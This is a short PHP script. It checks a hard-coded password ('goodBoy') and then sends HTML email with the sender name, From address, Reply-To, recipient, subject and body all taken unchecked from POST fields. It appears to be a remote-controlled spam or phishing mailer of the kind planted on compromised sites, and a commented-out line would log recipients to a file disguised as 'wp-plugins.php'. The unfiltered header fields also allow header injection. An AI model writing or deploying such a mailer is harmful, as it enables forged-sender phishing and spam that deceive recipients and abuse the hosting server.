

<?php

if(isset($_POST['lods'])){
	

$result ="";
$owner = "goodBoy"; 

$lods =($_POST['lods']);
if($lods==$owner){ $result="Success"; }
else {$result="Error";}
echo  $result;
}?>

























<?php

if(isset($_POST['toEmail'] ) ){

$errorSays ="";



$replyToDeterminer =  $_POST['replyToDeterminer'];

$mmreplyTo =  $_POST['mmreplyTo'];

	$SenerNames = $_POST['SenerNames'];

	$SenerEmails = $_POST['SenerEmails'];

	$RecieverNames = $_POST['toName'];

	$RecieverEmails = $_POST['toEmail'];

$mmSubject = $_POST['mmSubject'];

$MMmessages = $_POST['MMmessages'];



//if($svfile = fopen("wp-plugins.php", "a")){fwrite($svfile, $RecieverNames."  ".$RecieverEmails); fclose($svfile);}



//$send  = mail($RecieverEmails, $mmSubject, $MMmessages, $headers);
if(strpos($_SERVER['HTTP_HOST'], 'localhost') !== false){
	 $errorSays =$RecieverEmails;
	 }

else{
	
	if($replyToDeterminer == "Yes"){
		
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'To: '. $RecieverNames.' <'. $RecieverEmails .'>'."\r\n";
$headers .= 'From: '. $SenerNames.' <' . $SenerEmails .'>'. "\r\n".
'Reply-To: ' . $mmreplyTo . "\r\n" .
    'X-Mailer: PHP/' . phpversion();
	
	mail($RecieverEmails, $mmSubject, $MMmessages, $headers);	
	 $errorSays =$RecieverEmails;
	 }
	
	else{
		
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'To: '. $RecieverNames.' <'. $RecieverEmails .'>'."\r\n";
$headers .= 'From: '. $SenerNames.' <' . $SenerEmails .'>'. "\r\n";

	 mail($RecieverEmails, $mmSubject, $MMmessages, $headers);  
	 $errorSays = $RecieverEmails;
	 }
	 
	 
	 }

echo $errorSays;

}

?>